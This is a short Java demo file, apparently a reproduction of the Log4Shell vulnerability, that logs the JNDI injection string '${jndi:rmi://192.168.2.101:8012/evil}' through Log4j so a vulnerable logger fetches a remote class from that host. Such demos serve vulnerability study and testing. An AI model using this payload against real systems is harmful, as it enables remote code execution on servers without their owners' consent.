package com.demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.slf4j.LoggerFactory;


public class Log4jTest {
    private static   final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        String name = "${jndi:rmi://192.168.2.101:8012/evil}";
        logger.info("我是日志{}",name);
    }
}
